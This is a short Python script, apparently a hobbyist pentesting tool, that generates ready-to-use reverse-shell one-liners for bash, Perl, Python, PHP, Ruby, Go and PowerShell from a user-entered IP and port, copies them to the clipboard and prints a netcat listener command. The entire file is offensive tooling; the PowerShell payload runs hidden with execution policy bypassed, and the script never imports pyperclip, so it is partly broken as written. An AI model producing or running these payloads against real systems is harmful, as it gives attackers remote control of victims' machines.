#! /usr/bin/env python

# Created by d0nkeyk0ng787/gnome787

# Simple reverse shell generator
# Probably not the most practical script but it does work

def gen_shell(shell, ip, port):
	
	if shell.lower() == 'bash':
		s = "Your bash shell is: bash -i >& /dev/tcp/{}/{} 0>&1".format(ip, port)
		clipboard(s)
	elif shell.lower() == 'perl':
		s = "Your perl shell is: perl -e 'use Socket;$i=\"{}\";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'".format(ip, port)
		clipboard(s)
	elif shell.lower() == 'python':
		s = "Your python shell is: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'".format(ip, port)
		clipboard(s)
	elif shell.lower() == 'php':
		s = "Your php shell is: php -r '$sock=fsockopen(\"{}\",{});exec(\"/bin/sh -i <&3 >&3 2>&3\");'".format(ip, port)
		clipboard(s)
	elif shell.lower() == "ruby":
		s = "Your ruby shell is: ruby -rsocket -e'f=TCPSocket.open(\"{}\",{}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'".format(ip, port)
		clipboard(s)
	elif shell.lower() == 'golang':
		s = "Your golang shell is: echo 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{}:{}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go".format(ip, port)
		clipboard(s)
	elif shell.lower() == 'powershell':
		s = "Your powershell shell is: powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{}\",{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()".format(ip, port)
		clipboard(s)


def nc_listener(port):
	print("Your netcat listener command is: nc -lnvp " + port)


def shell_list():

	print("Here is a list of reverse shells this script can generate!")
	print("Bash")
	print("PERL")
	print("Python")
	print("PHP")
	print("Ruby")
	print("Golang")
	print("Powershell")


def clipboard(shell):
	s = shell
	pyperclip.copy(s)
	

def main():

	usage = True
	shells = ["bash", "perl", "python", "php", "ruby", "golang", "powershell"]

	print("Welcome to d0nkeyk0ngs reverse shell generator. Enter help for a list of shells you can generate!")
	print("Alternatively, type quit to exit the script!")
	
	while usage:

		selection = input("Which reverse shell would you like to generate: ")
		print(selection)

		if selection.lower() == "help":
			shell_list()
		else:
			if selection.lower() in shells:
				ip = input("Enter the IP you want the shell sent to: ")
				port = input("Enter the port you wish to use: ")
				gen_shell(selection, ip, port)
				nc_listener(port)
				break
			elif selection.lower() == 'quit':
				print("Quitting")
				usage = False
				break
			else:
				print("Please make a valid selection")
				break


if __name__ == '__main__':

	main()
